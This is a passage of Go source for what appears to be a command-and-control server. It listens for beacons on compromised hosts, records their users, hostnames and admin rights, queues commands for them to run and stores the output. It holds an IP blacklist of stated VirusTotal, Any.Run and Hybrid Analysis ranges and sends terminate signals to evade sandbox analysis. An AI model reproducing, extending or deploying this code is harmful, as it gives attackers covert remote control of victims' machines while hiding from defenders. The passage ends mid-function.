package main

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-contrib/sessions"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

const maxBeaconHTTPBody = 64 << 20
const maxManagedUploadSize int64 = 512 << 20

// activeListeners keeps track of running listener http.Server instances
var (
	activeListeners = make(map[string]*Listener)
	alMutex         sync.Mutex
)

// ══════════════════════════════════════════════════════════
//  GeoIP Lookup
// ══════════════════════════════════════════════════════════

var (
	geoCache   = make(map[string][2]string) // ip -> [country, countryCode]
	geoCacheMu sync.RWMutex
)

func lookupGeoIP(ip string) (string, string) {
	// Third-party GeoIP enrichment is opsec-sensitive and disabled by default.
	settingsMutex.RLock()
	enabled := GlobalSettings.GeoIPLookup
	settingsMutex.RUnlock()
	if !enabled {
		return "", ""
	}

	parsedIP := net.ParseIP(ip)
	if parsedIP == nil || parsedIP.IsLoopback() || parsedIP.IsPrivate() {
		return "", ""
	}

	geoCacheMu.RLock()
	if cached, ok := geoCache[ip]; ok {
		geoCacheMu.RUnlock()
		return cached[0], cached[1]
	}
	geoCacheMu.RUnlock()

	url := fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,countryCode", ip)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()

	var result struct {
		Status      string `json:"status"`
		Country     string `json:"country"`
		CountryCode string `json:"countryCode"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", ""
	}

	country, code := "", ""
	if result.Status == "success" {
		country = result.Country
		code = result.CountryCode
	}

	geoCacheMu.Lock()
	if len(geoCache) >= 8192 {
		// Simple bound: drop everything when full. Entries re-populate lazily.
		geoCache = make(map[string][2]string)
	}
	geoCache[ip] = [2]string{country, code}
	geoCacheMu.Unlock()

	return country, code
}

// ══════════════════════════════════════════════════════════
//  Callback Filter
// ══════════════════════════════════════════════════════════

var (
	filterMutex sync.RWMutex

	// IP whitelist: if non-empty, only these IPs/CIDRs are allowed
	ipWhitelist []string

	// IP blacklist: these IPs/CIDRs are always rejected
	ipBlacklist = []string{
		// Known VirusTotal scanner ranges
		"35.232.0.0/16", "34.96.0.0/16", "35.240.0.0/16",
		// Known Any.Run ranges
		"195.123.241.0/24",
		// Known Hybrid Analysis ranges
		"92.60.36.0/24",
		// Common sandbox exit nodes
		"20.99.160.0/24", "20.99.184.0/24",
	}
)

// isIPBlocked checks if the given IP should be filtered
func isIPBlocked(ip string) bool {
	filterMutex.RLock()
	defer filterMutex.RUnlock()

	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}

	// If whitelist is set, IP must be in whitelist
	if len(ipWhitelist) > 0 {
		allowed := false
		for _, entry := range ipWhitelist {
			if matchIPEntry(parsedIP, entry) {
				allowed = true
				break
			}
		}
		if !allowed {
			return true
		}
	}

	// Check blacklist
	for _, entry := range ipBlacklist {
		if matchIPEntry(parsedIP, entry) {
			return true
		}
	}

	return false
}

// matchIPEntry matches an IP against an entry which can be a single IP or CIDR
func matchIPEntry(ip net.IP, entry string) bool {
	if strings.Contains(entry, "/") {
		_, cidr, err := net.ParseCIDR(entry)
		if err != nil {
			return false
		}
		return cidr.Contains(ip)
	}
	return ip.Equal(net.ParseIP(entry))
}

// filterResponse sends a termination signal so the beacon exits permanently
func filterResponse(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("__TERMINATE__"))
}

// ── Helper Functions ──────────────────────────────────────

// extractIP removes the port from RemoteAddr (e.g. "127.0.0.1:12345" -> "127.0.0.1")
func extractIP(remoteAddr string) string {
	if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
		return host
	}
	return remoteAddr
}

func processCommand(clientID, command string) (string, interface{}, error) {
	cmdLower := strings.ToLower(command)

	// Handle sleep/delay config changes locally
	if strings.HasPrefix(cmdLower, "sleep ") || strings.HasPrefix(cmdLower, "delay ") {
		parts := strings.Fields(command)
		if len(parts) >= 2 {
			if sleepVal, err := strconv.Atoi(parts[1]); err == nil {
				if sleepVal < 1 || sleepVal > 86400 {
					return "", nil, fmt.Errorf("sleep must be between 1 and 86400 seconds")
				}
				var client Client
				if err := db.First(&client, "id = ?", clientID).Error; err == nil {
					client.Sleep = sleepVal
					if len(parts) >= 3 {
						if jitterVal, err := strconv.Atoi(parts[2]); err == nil {
							if jitterVal < 0 || jitterVal > 100 {
								return "", nil, fmt.Errorf("jitter must be between 0 and 100")
							}
							client.Jitter = jitterVal
						} else {
							return "", nil, fmt.Errorf("invalid jitter value")
						}
					}
					if err := db.Save(&client).Error; err != nil {
						return "", nil, err
					}
					emitClusterEvent("beacon_config", map[string]interface{}{
						"beacon_id": clientID, "sleep": client.Sleep, "jitter": client.Jitter,
					}, client.HomeNodeID)
					msg := fmt.Sprintf("BEACON_CONFIG_UPDATE: sleep=%d jitter=%d for %s", client.Sleep, client.Jitter, clientID)
					go addLog("CONFIG", msg)
					return "CONFIG_UPDATED", nil, nil
				}
				return "", nil, fmt.Errorf("client not found: %s", clientID)
			}
		}
		return "", nil, fmt.Errorf("invalid sleep command")
	}

	// Handle note command locally
	if strings.HasPrefix(cmdLower, "note ") {
		note := strings.TrimSpace(command[5:])
		result := db.Model(&Client{}).Where("id = ?", clientID).Update("note", note)
		if result.Error != nil {
			return "", nil, result.Error
		}
		if result.RowsAffected == 0 {
			return "", nil, fmt.Errorf("client not found: %s", clientID)
		}
		var client Client
		if err := db.First(&client, "id = ?", clientID).Error; err == nil {
			emitClusterEvent("beacon_note", map[string]string{"beacon_id": clientID, "note": note}, client.HomeNodeID)
		}
		go addLog("C2", fmt.Sprintf("NOTE_SET: %s -> %s", clientID, note))
		return "NOTE_SET", nil, nil
	}

	task, err := createPendingTask(clientID, command)
	if err != nil {
		return "", nil, err
	}

	go addLog("TASK", fmt.Sprintf("NEW_TASK_QUEUED: %s for %s", command, clientID))
	return "TASK_QUEUED", task, nil
}

func newTaskID() string {
	// 32 hex chars: infeasible to brute-force, so results cannot be forged
	// by guessing task IDs even before HMAC auth is considered.
	return "T-" + strings.ReplaceAll(uuid.New().String(), "-", "")
}

func createPendingTask(clientID, command string) (*Task, error) {
	if strings.TrimSpace(clientID) == "" || strings.TrimSpace(command) == "" {
		return nil, fmt.Errorf("client id and command are required")
	}
	var client Client
	if err := db.Select("id", "home_node_id").First(&client, "id = ?", clientID).Error; err != nil {
		return nil, fmt.Errorf("client not found: %s", clientID)
	}
	for attempt := 0; attempt < 5; attempt++ {
		task := &Task{
			ID:         newTaskID(),
			ClientID:   clientID,
			Command:    command,
			Status:     "pending",
			OriginNode: localNodeID(),
			CreatedAt:  time.Now(),
		}
		if err := db.Create(task).Error; err != nil {
			// Retry on possible primary key collision.
			if strings.Contains(strings.ToLower(err.Error()), "unique") || strings.Contains(strings.ToLower(err.Error()), "constraint") {
				continue
			}
			return nil, err
		}
		// Cluster: when the beacon lives on another node, forward the task to
		// its home node, which queues it for delivery at the next check-in.
		if home := client.HomeNodeID; home != "" && home != localNodeID() {
			emitClusterEvent("task_create", task, home)
		}
		return task, nil
	}
	return nil, fmt.Errorf("failed to create unique task id")
}

func claimPendingTasks(clientID string) ([]Task, error) {
	claimed := make([]Task, 0)
	err := db.Transaction(func(tx *gorm.DB) error {
		var candidates []Task
		if err := tx.Where("client_id = ? AND status = ?", clientID, "pending").Order("created_at asc").Find(&candidates).Error; err != nil {
			return err
		}
		for _, task := range candidates {
			result := tx.Model(&Task{}).Where("id = ? AND status = ?", task.ID, "pending").Update("status", "running")
			if result.Error != nil {
				return result.Error
			}
			if result.RowsAffected == 1 {
				task.Status = "running"
				claimed = append(claimed, task)
			}
		}
		return nil
	})
	return claimed, err
}

// ── Task completion + waiter notification ─────────────────

// taskWaiters lets sendTaskAndWait sleep on a channel instead of polling the
// database every 500ms. Result ingestion calls notifyTaskWaiters.
var (
	taskWaitersMu sync.Mutex
	taskWaiters   = make(map[string]chan *Task)
)

func registerTaskWaiter(taskID string) chan *Task {
	ch := make(chan *Task, 4)
	taskWaitersMu.Lock()
	taskWaiters[taskID] = ch
	taskWaitersMu.Unlock()
	return ch
}

func removeTaskWaiter(taskID string) {
	taskWaitersMu.Lock()
	delete(taskWaiters, taskID)
	taskWaitersMu.Unlock()
}

func notifyTaskWaiters(task *Task) {
	taskWaitersMu.Lock()
	ch, ok := taskWaiters[task.ID]
	taskWaitersMu.Unlock()
	if ok {
		select {
		case ch <- task:
		default:
		}
	}
}

// maxTaskResultSize caps beacon result storage per task.
const maxTaskResultSize = 32 << 20

// completeTask stores a result for a running task, wakes any waiter and
// propagates the result to the issuing cluster node when it is remote.
func completeTask(taskID, beaconID, output string) bool {
	var task Task
	if err := db.First(&task, "id = ? AND client_id = ? AND status = ?", taskID, beaconID, "running").Error; err != nil {
		return false
	}
	if len(output) > maxTaskResultSize {
		output = output[:maxTaskResultSize]
	}
	task.Status = "completed"
	task.Result = output
	if err := db.Model(&Task{}).Where("id = ?", task.ID).Updates(map[string]interface{}{
		"status": "completed",
		"result": output,
	}).Error; err != nil {
		addLog("ERR", "TASK_RESULT_SAVE_FAILED: "+err.Error())
		return false
	}
	task.Status = "completed"
	task.Result = output
	notifyTaskWaiters(&task)
	emitClusterEvent("task_result", map[string]string{
		"task_id": task.ID, "status": task.Status, "result": output,
	}, task.OriginNode)
	addLog("TASK", fmt.Sprintf("TASK_COMPLETED: %s on %s", task.Command, task.ClientID))
	return true
}

var (
	GlobalSettings Settings
	settingsMutex  sync.RWMutex
)

// cluster hooks: wired up by cluster.go at startup. No-ops on a standalone node.
var clusterEventHook func(eventType string, payload interface{}, targetNode string)

// emitClusterEvent forwards an internal event to the cluster sync engine.
// targetNode selects a single peer; empty means broadcast to all peers.
func emitClusterEvent(eventType string, payload interface{}, targetNode string) {
	if clusterEventHook != nil {
		clusterEventHook(eventType, payload, targetNode)
	}
}

func addLog(level, msg string) {
	appendLog(level, msg, true)
}

// appendLog stores a log entry in the in-memory ring and broadcasts it. When
// propagate is false (logs received from cluster peers), the event is not
// re-emitted to the cluster, which would otherwise loop forever.
func appendLog(level, msg string, propagate bool) {
	wsMutex.Lock()

	logEntry := map[string]string{
		"level":   level,
		"message": msg,
		"time":    time.Now().Format("15:04:05"),
	}
	logJSON, _ := json.Marshal(logEntry)
	logStr := string(logJSON)

	logs = append(logs, logStr)
	if len(logs) > 200 {
		logs = logs[1:]
	}
	wsMutex.Unlock()

	broadcastWS(logStr)
	if propagate {
		emitClusterEvent("log", logEntry, "")
	}

	settingsMutex.RLock()
	debug := GlobalSettings.Debug
	settingsMutex.RUnlock()

	if debug {
		log.Printf("[%s] %s\n", level, msg)
	}
}

// ── Initialization ───────────────────────────────────────
func init() {
	initDB()

	// Load Global Settings
	db.First(&GlobalSettings)
	settingsMutex = sync.RWMutex{}

	// Reset all listeners to stopped on startup
	db.Model(&Listener{}).Where("status = ?", "running").Update("status", "stopped")

	// Beacon offline detection goroutine
	go func() {
		for {
			time.Sleep(30 * time.Second)
			// Load only the fields needed by the periodic offline scan.
			var clients []struct {
				ID        string
				Username  string
				Hostname  string
				IP        string
				Sleep     int
				LastCheck time.Time
			}
			db.Model(&Client{}).
				Select("id", "username", "hostname", "ip", "sleep", "last_check").
				Where("status = ?", "online").
				Scan(&clients)
			for _, c := range clients {
				threshold := time.Duration(c.Sleep*3) * time.Second
				if threshold < 90*time.Second {
					threshold = 90 * time.Second
				}
				if time.Since(c.LastCheck) > threshold {
					// Do not overwrite a concurrent check-in that refreshed last_check.
					cutoff := time.Now().Add(-threshold)
					result := db.Model(&Client{}).
						Where("id = ? AND status = ? AND last_check <= ?", c.ID, "online", cutoff).
						Update("status", "offline")
					if result.Error != nil || result.RowsAffected != 1 {
						continue
					}
					addLog("C2", fmt.Sprintf("BEACON_OFFLINE: %s (%s@%s, last seen %s ago)", c.ID, c.Username, c.Hostname, time.Since(c.LastCheck).Round(time.Second)))

					// Broadcast beacon offline event via WS
					event := map[string]string{
						"type":      "beacon_offline",
						"beacon_id": c.ID,
						"hostname":  c.Hostname,
						"ip":        c.IP,
					}
					eventJSON, _ := json.Marshal(event)
					broadcastWS(string(eventJSON))
					emitClusterEvent("beacon_offline", map[string]string{"beacon_id": c.ID}, "")
				}
			}
		}
	}()

	// Upload session cleanup goroutine (remove stale sessions after 30 min)
	go func() {
		for {
			time.Sleep(5 * time.Minute)
			uploadSessionsMu.Lock()
			for id, s := range uploadSessions {
				if time.Since(s.CreatedAt) > 30*time.Minute {
					os.RemoveAll(s.TempDir)
					delete(uploadSessions, id)
					addLog("FILE", fmt.Sprintf("UPLOAD_SESSION_EXPIRED: %s (%s)", id, s.FileName))
				}
			}
			uploadSessionsMu.Unlock()
		}
	}()

	// Old task pruning: results can be tens of MB each, so completed/failed
	// tasks older than 90 days are removed to keep the database lean.
	go func() {
		for {
			time.Sleep(6 * time.Hour)
			cutoff := time.Now().Add(-90 * 24 * time.Hour)
			result := db.Where("status IN ? AND created_at < ?", []string{"completed", "failed"}, cutoff).Delete(&Task{})
			if result.Error == nil && result.RowsAffected > 0 {
				addLog("SYS", fmt.Sprintf("TASK_PRUNED: removed %d tasks older than 90 days", result.RowsAffected))
			}
		}
	}()

	addLog("SYS", "PRTS TERMINAL INITIALIZED")
	addLog("NET", "SCANNING FOR ACTIVE NODES...")
	addLog("SEC", "ENCRYPTION LAYER STABLE")
}

// broadcastWS delivers a message to every connected dashboard. Each client
// has its own writer goroutine, so this never performs network I/O inline
// and a slow client is dropped instead of blocking everyone.
func broadcastWS(msg string) {
	wsMutex.Lock()
	clients := make([]*wsClient, 0, len(wsClients))
	for c := range wsClients {
		clients = append(clients, c)
	}
	wsMutex.Unlock()

	for _, c := range clients {
		select {
		case c.send <- msg:
		default:
			// Buffer full: the client cannot keep up. Drop it.
			go c.shutdown()
		}
	}
}

// ══════════════════════════════════════════════════════════
//  Listener Management
// ══════════════════════════════════════════════════════════

func (l *Listener) Start() error {
	alMutex.Lock()
	defer alMutex.Unlock()

	if _, running := activeListeners[l.ID]; running {
		return fmt.Errorf("LISTENER_ALREADY_RUNNING")
	}

	switch l.Type {
	case "reverse_http":
		mux := http.NewServeMux()
		mux.HandleFunc("/checkin", handleBeaconCheckin)

		l.server = &http.Server{
			Addr:    fmt.Sprintf("%s:%d", l.BindIP, l.Port),
			Handler: mux,
		}

		go func() {
			if err := l.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Printf("[!] Listener %s failed: %v\n", l.Name, err)
				db.Model(l).Update("status", "stopped")
			}
		}()

	case "reverse_tcp":
		ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", l.BindIP, l.Port))
		if err != nil {
			return fmt.Errorf("TCP_LISTEN_FAILED: %v", err)
		}
		l.tcpListener = ln

		go func() {
			for {
				conn, err := ln.Accept()
				if err != nil {
					if !strings.Contains(err.Error(), "use of closed") {
						log.Printf("[!] TCP listener %s accept error: %v\n", l.Name, err)
					}
					return
				}
				go handleTCPBeaconConn(conn, l.ID)
			}
		}()

	case "reverse_https":
		return fmt.Errorf("HTTPS_LISTENER_REQUIRES_TLS_CONFIGURATION")

	default:
		return fmt.Errorf("unsupported listener type: %s", l.Type)
	}

	l.Status = "running"
	if err := db.Model(l).Updates(map[string]interface{}{"status": "running"}).Error; err != nil {
		addLog("ERR", "LISTENER_STATUS_SAVE_FAILED: "+err.Error())
	}

	activeListeners[l.ID] = l

	return nil
}

func (l *Listener) Stop() error {
	alMutex.Lock()
	_, wasRunning := activeListeners[l.ID]
	alMutex.Unlock()
	if !wasRunning && l.server == nil && l.tcpListener == nil {
		// Nothing running locally; just make sure the row is consistent.
		db.Model(l).Update("status", "stopped")
		return nil
	}

	if l.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := l.server.Shutdown(ctx); err != nil {
			return err
		}
		l.server = nil
	}
	if l.tcpListener != nil {
		l.tcpListener.Close()
		l.tcpListener = nil
	}
	l.Status = "stopped"
	db.Model(l).Update("status", "stopped")

	alMutex.Lock()
	delete(activeListeners, l.ID)
	alMutex.Unlock()

	return nil
}

// parseBeaconOS extracts OS info from headers or user-agent
func parseBeaconOS(r *http.Request) string {
	if osHeader := r.Header.Get("X-Beacon-OS"); osHeader != "" {
		return osHeader
	}
	ua := r.UserAgent()
	switch {
	case strings.Contains(ua, "Windows"):
		return "Windows"
	case strings.Contains(ua, "Linux"):
		return "Linux"
	case strings.Contains(ua, "Darwin"), strings.Contains(ua, "Mac"):
		return "macOS"
	default:
		return "Unknown"
	}
}

// beaconNodeName formats a beacon's default display name without assuming its
// client-supplied ID has UUID length.
func beaconNodeName(beaconID string) string {
	if len(beaconID) > 8 {
		beaconID = beaconID[:8]
	}
	return "NODE_" + beaconID
}

// ── TCP Protocol Helpers ─────────────────────────────────

// tcpWriteMsg sends a length-prefixed JSON message over TCP
// Frame: [4 bytes big-endian length][JSON payload]
func tcpWriteMsg(conn net.Conn, msg interface{}) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	length := uint32(len(data))
	header := []byte{byte(length >> 24), byte(length >> 16), byte(length >> 8), byte(length)}
	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err = conn.Write(data)
	return err
}

// tcpReadMsg reads a length-prefixed JSON message from TCP
func tcpReadMsg(conn net.Conn) ([]byte, error) {
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}
	length := uint32(header[0])<<24 | uint32(header[1])<<16 | uint32(header[2])<<8 | uint32(header[3])
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf("message too large: %d bytes", length)
	}
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, err
	}
	return data, nil
}

// handleTCPBeaconConn handles a single TCP beacon connection.
// Every message must carry a valid HMAC signature (TCPMsg.TS + TCPMsg.Sig).
// The key is resolved during registration (beacon_id -> payload key) and then
// reused for the lifetime of the connection.
func handleTCPBeaconConn(conn net.Conn, listenerID string) {
	defer conn.Close()
	remoteIP := extractIP(conn.RemoteAddr().String())

	// Callback filter: check IP
	if isIPBlocked(remoteIP) {
		addLog("FILTER", fmt.Sprintf("TCP_IP_BLOCKED: %s", remoteIP))
		// Send terminate signal so beacon exits permanently
		tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
		return
	}

	var beaconID string
	var beaconKey string

	for {
		conn.SetReadDeadline(time.Now().Add(5 * time.Minute))

		raw, err := tcpReadMsg(conn)
		if err != nil {
			// Connection closed or error
			if beaconID != "" {
				// Don't immediately mark offline - the status checker will handle it
				log.Printf("[TCP] Beacon %s disconnected from %s", beaconID, remoteIP)
			}
			return
		}

		var msg TCPMsg
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}

		switch msg.Type {
		case "register":
			var regData CheckInData
			if err := json.Unmarshal(msg.Data, &regData); err != nil {
				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
				continue
			}
			if strings.TrimSpace(regData.BeaconID) == "" {
				// An empty ID would create a shared primary key and merge all
				// uninitialized TCP beacons into one client record.
				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
				continue
			}

			// Authentication: signed messages verify the HMAC and bind the
			// payload key; unsigned messages are only accepted when legacy
			// compatibility is enabled (pre-HMAC payloads).
			if msg.Sig != "" || msg.TS != 0 {
				if msg.Sig == "" {
					// Timestamp without signature: malformed.
					addLog("SEC", fmt.Sprintf("TCP_AUTH_REJECTED: %s from %s (MALFORMED)", regData.BeaconID, remoteIP))
					tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
					return
				}
				key, _, ok := credentialForBeacon(regData.BeaconID, tcpSignString("register", msg.TS, msg.Nonce, msg.Data), msg.Sig)
				if !ok {
					addLog("SEC", fmt.Sprintf("TCP_AUTH_REJECTED: %s from %s", regData.BeaconID, remoteIP))
					tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
					return
				}
				beaconKey = key
			} else {
				settingsMutex.RLock()
				legacyOK := GlobalSettings.LegacyBeaconAuth
				settingsMutex.RUnlock()
				if !legacyOK {
					addLog("SEC", fmt.Sprintf("TCP_AUTH_REJECTED: %s from %s (LEGACY_DISABLED)", regData.BeaconID, remoteIP))
					tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
					return
				}
				beaconKey = ""
				addLog("SEC", fmt.Sprintf("LEGACY_TCP_BEACON: %s from %s (unsigned protocol)", regData.BeaconID, remoteIP))
			}

			tcpSleep := regData.Sleep
			if tcpSleep <= 0 {
				tcpSleep = 60
			}
			tcpJitter := regData.Jitter
			if tcpJitter < 0 {
				tcpJitter = 10
			}

			beaconID = regData.BeaconID

			var client Client
			result := db.First(&client, "id = ?", beaconID)
			if result.Error != nil {
				// New beacon
				tcpCountry, tcpCountryCode := lookupGeoIP(remoteIP)
				client = Client{
					ID:          beaconID,
					Name:        beaconNodeName(beaconID),
					IP:          remoteIP,
					InternalIP:  regData.InternalIP,
					Status:      "online",
					OS:          regData.OS,
					Hostname:    regData.Hostname,
					Username:    regData.Username,
					Domain:      regData.Domain,
					Arch:        regData.Arch,
					PID:         regData.PID,
					ProcessName: regData.ProcessName,
					IsAdmin:     regData.IsAdmin,
					ListenerID:  listenerID,
					HomeNodeID:  localNodeID(),
					FirstSeen:   time.Now(),
					LastCheck:   time.Now(),
					Sleep:       tcpSleep,
					Jitter:      tcpJitter,
					Country:     tcpCountry,
					CountryCode: tcpCountryCode,
				}
				if err := db.Create(&client).Error; err != nil {
					addLog("ERR", "TCP_BEACON_CREATE_FAILED: "+err.Error())
				}
				addLog("C2", fmt.Sprintf("NEW_TCP_BEACON: %s@%s from %s [%s]", regData.Username, regData.Hostname, remoteIP, tcpCountryCode))

				event := map[string]interface{}{
					"type": "new_beacon", "beacon_id": beaconID,
					"ip": remoteIP, "hostname": regData.Hostname,
					"username": regData.Username, "os": regData.OS,
					"is_admin": regData.IsAdmin,
				}
				eventJSON, _ := json.Marshal(event)
				broadcastWS(string(eventJSON))
				emitClusterEvent("beacon_update", client, "")
			} else {
				// Existing beacon reconnect
				client.Status = "online"
				client.IP = remoteIP
				client.LastCheck = time.Now()
				client.InternalIP = regData.InternalIP
				client.Hostname = regData.Hostname
				client.Username = regData.Username
				client.Domain = regData.Domain
				client.PID = regData.PID
				client.ProcessName = regData.ProcessName
				client.IsAdmin = regData.IsAdmin
				if regData.OS != "" {
					client.OS = regData.OS
				}
				if regData.Sleep > 0 {
					client.Sleep = regData.Sleep
				}
				if regData.Jitter >= 0 {
					client.Jitter = regData.Jitter
				}
				if err := db.Save(&client).Error; err != nil {
					addLog("ERR", "TCP_BEACON_UPDATE_FAILED: "+err.Error())
				}
				emitClusterEvent("beacon_update", client, "")
			}
			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})

		case "checkin":
			if beaconID == "" {
				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"NOT_REGISTERED"`)})
				continue
			}
			// Signed connections verify every message; legacy connections
			// (beaconKey == "") skip verification.
			if beaconKey != "" && !authTCPMsg(beaconKey, &msg, msg.Data) {
				addLog("SEC", fmt.Sprintf("TCP_AUTH_FAILED: %s from %s", beaconID, remoteIP))
				tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
				return
			}

			// Update last check. The conditional clause skips the write while
			// the row is fresh, cutting database churn for frequent check-ins.
			now := time.Now()
			db.Model(&Client{}).Where("id = ? AND (last_check <= ? OR status != ?)", beaconID, now.Add(-5*time.Second), "online").
				Updates(map[string]interface{}{
					"last_check": now,
					"status":     "online",
					"ip":         remoteIP,
				})

			// Check for pending tasks
			pendingTasks, err := claimPendingTasks(beaconID)
			if err != nil {
				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
				continue
			}

			if len(pendingTasks) > 0 {
				tasksJSON, _ := json.Marshal(pendingTasks)
				tcpWriteMsg(conn, TCPMsg{Type: "tasks", Data: json.RawMessage(tasksJSON)})
			} else {
				// No tasks - send sleep config
				var client Client
				db.First(&client, "id = ?", beaconID)
				sleepCfg := map[string]int{"sleep": client.Sleep, "jitter": client.Jitter}
				sleepJSON, _ := json.Marshal(sleepCfg)
				tcpWriteMsg(conn, TCPMsg{Type: "sleep", Data: json.RawMessage(sleepJSON)})
			}

		case "result":
			if beaconID == "" {
				continue
			}
			if beaconKey != "" && !authTCPMsg(beaconKey, &msg, msg.Data) {
				addLog("SEC", fmt.Sprintf("TCP_AUTH_FAILED: %s from %s", beaconID, remoteIP))
				tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
				return
			}
			var taskResult TaskResultData
			if err := json.Unmarshal(msg.Data, &taskResult); err != nil || taskResult.TaskID == "" {
				continue
			}
			completeTask(taskResult.TaskID, beaconID, taskResult.Output)
			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})

		default:
			// Unknown or unsigned control message types (e.g. terminate sent
			// by us) are ignored on the inbound path.
		}
	}
}

// ── HTTP Beacon Check-in ─────────────────────────────────
//
// Current protocol: all beacon traffic is POST + HMAC authenticated:
//   X-Beacon-ID / X-Beacon-Timestamp / X-Beacon-Nonce /
//   X-Beacon-Sign = hex(HMAC(key, ts + "." + nonce + "." + body))
//
// Body semantics (matching the original wire format):
//   - CheckInData JSON (beacon_id + hostname) -> registration
//   - TaskResultData JSON (task_id)           -> task result
//   - anything else                           -> poll; response is the claimed
//     tasks JSON array, or "SLEEP <n> <jitter>" when idle.
//
// Legacy compatibility (Settings.LegacyBeaconAuth, default on): requests
// without an X-Beacon-Sign header are served with the pre-HMAC protocol so
// payloads generated before the upgrade keep working. Unsigned access is
// inherently weaker — disable the setting once every payload is re-issued.

func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Callback filter: check IP
	remoteIP := extractIP(r.RemoteAddr)
	if isIPBlocked(remoteIP) {
		addLog("FILTER", fmt.Sprintf("IP_BLOCKED: %s", remoteIP))
		filterResponse(w)
		return
	}

	// Unauthenticated flood protection before touching the database.
	if !allowCheckin(remoteIP) {
		w.WriteHeader(http.StatusTooManyRequests)
		return
	}

	if r.Header.Get("X-Beacon-Sign") == "" {
		settingsMutex.RLock()
		legacyOK := GlobalSettings.LegacyBeaconAuth
		settingsMutex.RUnlock()
		if !legacyOK {
			addLog("SEC", fmt.Sprintf("BEACON_AUTH_REJECTED: %s from %s (MISSING_AUTH_HEADERS)", r.Header.Get("X-Beacon-ID"), remoteIP))
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte("AUTH_REQUIRED"))
			return
		}
		handleLegacyBeaconCheckin(w, r, remoteIP)
		return
	}

	if r.Method != http.MethodPost {
		// Polling is POST-only in the HMAC protocol; GET cannot carry a body
		// signature, so it no longer leaks task output.
		w.Header().Set("Allow", "POST")
		w.WriteHeader(http.StatusMethodNotAllowed)
		w.Write([]byte("POST_ONLY"))
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, maxBeaconHTTPBody)
	body, err := io.ReadAll(r.Body)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	r.Body.Close()

	authID, ok, reason := authBeaconRequest(r.Header.Get("X-Beacon-ID"), r.Header.Get("X-Beacon-Sign"), r.Header.Get("X-Beacon-Timestamp"), r.Header.Get("X-Beacon-Nonce"), body)
	if !ok {
		addLog("SEC", fmt.Sprintf("BEACON_AUTH_REJECTED: %s from %s (%s)", authID, remoteIP, reason))
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte("AUTH_REQUIRED"))
		return
	}

	beaconDispatch(w, r, remoteIP, authID, body)
}

// beaconDispatch routes an authenticated request body to register / result /
// poll handling. Shared by the HMAC and legacy protocol paths.
func beaconDispatch(w http.ResponseWriter, r *http.Request, remoteIP, authID string, body []byte) {
	// Registration?
	var regData CheckInData
	if err := json.Unmarshal(body, &regData); err == nil && regData.BeaconID != "" && regData.Hostname != "" {
		if regData.BeaconID != authID {
			// The signed identity must match the body identity.
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte("AUTH_REQUIRED"))
			return
		}
		handleBeaconRegistration(w, r, regData)
		return
	}

	// Task result?
	var result TaskResultData
	if err := json.Unmarshal(body, &result); err == nil && result.TaskID != "" {
		if strings.TrimSpace(result.BeaconID) == "" || result.BeaconID != authID {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		completeTask(result.TaskID, result.BeaconID, result.Output)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
		return
	}

	// Check-in / poll for tasks
	beaconPoll(w, authID, remoteIP, parseBeaconOS(r))
}

// beaconPoll updates the beacon row and answers with claimed tasks or a SLEEP
// directive. Shared by both protocol paths.
func beaconPoll(w http.ResponseWriter, authID, remoteIP, beaconOS string) {
	var client Client
	if err := db.First(&client, "id = ?", authID).Error; err == nil {
		// Existing beacon check-in. Conditional update skips database churn
		// while the row is fresh (offline detector thresholds are >= 90s).
		now := time.Now()
		ip := remoteIP
		if client.IP == ip && client.Status == "online" {
			db.Model(&Client{}).Where("id = ? AND last_check <= ?", authID, now.Add(-5*time.Second)).
				Update("last_check", now)
		} else {
			updates := map[string]interface{}{"last_check": now, "status": "online", "ip": ip}
			if beaconOS != "Unknown" && beaconOS != "" {
